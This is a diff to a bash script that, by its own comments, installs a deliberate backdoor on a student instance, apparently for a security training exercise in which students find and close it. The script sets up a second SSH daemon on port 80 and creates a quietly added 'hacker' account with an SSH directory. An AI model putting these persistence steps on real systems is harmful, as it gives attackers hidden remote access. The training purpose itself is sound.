@@ -1,8 +1,12 @@
 #!/bin/bash
 #
 # install a backdoor on the student instance
+# If you are reading this, you should have enough information to close it!
 
 # Create port80 config file
+if [ -r /etc/ssh/sshd80_config ]; then
+    exit 0			# already installed
+fi
 sudo cp /etc/ssh/sshd_config /etc/ssh/sshd80_config
 sudo sed -i 's/#Port 22/Port 80/' /etc/ssh/sshd80_config
 
@@ -21,7 +25,7 @@ sudo systemctl enable ssh80
 # Will this be obvious enough for the students?
 
 # Create the hacker user
-sudo adduser --quiet --disabled-password --gecos hacker hacker
+sudo adduser --quiet --disabled-password --gecos hacker hacker >/dev/null 2>&1
 sudo mkdir -p /home/hacker/.ssh
 sudo chmod 700 /home/hacker/.ssh
 sudo chown hacker:hacker /home/hacker/.ssh
